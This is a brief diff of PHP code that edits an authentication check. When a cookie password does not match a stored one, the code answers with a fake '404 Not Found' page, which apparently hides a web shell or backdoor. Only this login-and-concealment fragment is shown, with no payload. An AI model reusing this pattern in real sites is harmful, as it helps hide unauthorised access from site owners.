@@ -24,7 +24,7 @@ if(!function_exists('auth')){
 				}
 			}
 
-			elseif(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
+			if(!isset($c['pass']) || ((isset($c['pass'])&&($c['pass']!=$GLOBALS['pass'])))){
 				header("HTTP/1.0 404 Not Found");
 				$res = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n".
 						"<html><head>\n".
